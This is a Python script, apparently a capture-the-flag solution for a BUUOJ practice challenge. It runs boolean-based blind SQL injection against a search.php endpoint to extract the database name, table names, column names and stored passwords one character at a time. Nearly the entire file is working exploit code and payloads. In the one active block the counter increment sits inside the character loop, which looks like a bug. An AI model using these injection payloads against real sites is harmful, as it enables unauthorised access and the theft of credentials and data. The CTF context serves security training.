import requests
import time

# url是随时更新的，具体的以做题时候的为准
url = 'http://f92fd483-07e0-44d4-b2f3-b1d720bd2977.node4.buuoj.cn:81/search.php?id='
table=""
database=""
column=""
username=""
flag = "Not this"


'''这是database'''
# subs=1
# while True:
#     payload = "''or(ascii(substr((database()),{0},1))={1})"
#     targetUrl=url+payload
#     for c in range(33,128):
#         res=requests.get(targetUrl.format(subs,c))
#         if flag in res.text:
#             database+=chr(c)
#             print(database)
#     subs+=1
#     time.sleep(0.05)


'''这是tables'''
# subs = 1
# while True:
#     payload = "''or(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),{0},1))={1})"
#     targetUrl=url+payload
#     for c in range(33,128):
#         res=requests.get(targetUrl.format(subs,c))
#         if flag in res.text:
#             table+=chr(c)
#             print(table)
#     subs+=1
#     time.sleep(0.05)


'''这是columns'''
# subs = 1
# while True:
#     payload = "''or(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)='F1naI1y'),{0},1))={1})"
#     targetUrl=url+payload
#     for c in range(33,128):
#         res=requests.get(targetUrl.format(subs,c))
#         if flag in res.text:
#             column+=chr(c)
#             print(column)
#     subs+=1
#     time.sleep(0.05)


'''这是username'''
subs=1
while True:
    payload = "''or(ascii(substr((select(group_concat(password))from(F1naI1y)),{0},1))={1})"
    targetUrl = url + payload
    # c表示33~127位ASCII中可显示字符
    for c in range(33, 128):
        res = requests.get(targetUrl.format(subs, c))
        if flag in res.text:
            username += chr(c)
            print(username)
            # break
        subs+=1
    time.sleep(0.05)


'''这是flag'''
# subs=1
# while True:
#     payload = "''or(ascii(substr((select(password)from(F1naI1y)where(username='flag')),{0},1))={1})"
#     targetUrl = url + payload
#     # c表示33~127位ASCII中可显示字符
#     for c in range(33, 128):
#         res = requests.get(targetUrl.format(subs, c))
#         if flag in res.text:
#             table += chr(c)
#             print(table)
#             # break
#     subs+=1
#     time.sleep(0.05)
